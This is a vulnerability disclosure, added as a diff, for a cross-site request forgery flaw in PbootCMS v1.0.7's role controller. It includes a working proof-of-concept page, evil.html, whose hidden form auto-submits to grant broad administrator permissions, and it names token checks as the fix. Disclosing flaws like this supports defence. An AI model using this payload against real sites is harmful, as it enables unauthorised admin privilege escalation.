@@ -1,0 +1,49 @@
+There is a CSRF(Cross Site Request Forgery) security vulnerablity in PbootCMS  v1.0.7 
+
+Description:
+An issue was discovered in PbootCMS  v1.0.7.  
+Cross-site request forgery (CSRF) vulnerability in /PbootCMS/apps/admin/controller/system/RoleController.php allows remote attackers to 
+add administrator accounts.
+
+Triggering condition: Administrator clicks on malicious link
+
+The Cause of the vulnerability:
+In 49th of RoleController.php script:
+We can find that this script does not have an anti-csrf mechanism.
+
+Poc:
+Logined administrator clicks the url:http://192.168.2.2/evil.html
+
+payload:http://127.0.0.1/PbootCMS/admin.php/role/add.html
+
+evil.html:
+<form action="http://127.0.0.1/PbootCMS/admin.php/role/add.html" method="POST">
+<input type="text" name="name" value="test" />
+<input type="text" name="description" value="test" />
+<input type="text" name="acodes[0]" value="cn" />
+<input type="text" name="levels[0]" value="/admin/M156/index" />
+<input type="text" name="levels[1]" value="/admin/Config/index" />
+<input type="text" name="levels[6]" value="/admin/Label/mod" />
+<input type="text" name="levels[10]" value="/admin/Model/mod" />
+<input type="text" name="levels[14]" value="/admin/ExtField/mod" />
+<input type="text" name="levels[17]" value="/admin/Site/mod" />
+<input type="text" name="levels[19]" value="/admin/Company/mod" />
+<input type="text" name="levels[23]" value="/admin/ContentSort/mod" />
+<input type="text" name="levels[30]" value="/admin/Content/mod" />
+<input type="text" name="levels[34]" value="/admin/Message/mod" />
+<input type="text" name="levels[38]" value="/admin/Slide/mod" />
+<input type="text" name="levels[42]" value="/admin/Link/mod" />
+<input type="text" name="levels[47]" value="/admin/Area/mod" />
+<input type="text" name="levels[51]" value="/admin/Menu/mod" />
+<input type="text" name="levels[55]" value="/admin/Role/mod" />
+<input type="text" name="levels[59]" value="/admin/User/mod" />
+<input type="text" name="levels[64]" value="/admin/Type/mod" />
+<input type="text" name="levels[65]" value="/admin/Database/index" />
+<input type="text" name="levels[66]" value="/admin/Site/server" />
+</form>
+<script> document.forms[0].submit(); </script>
+
+The evil.html is only used to prove that you can add an administrator account and gain some permission.
+
+Repair method:
+Join the random token check
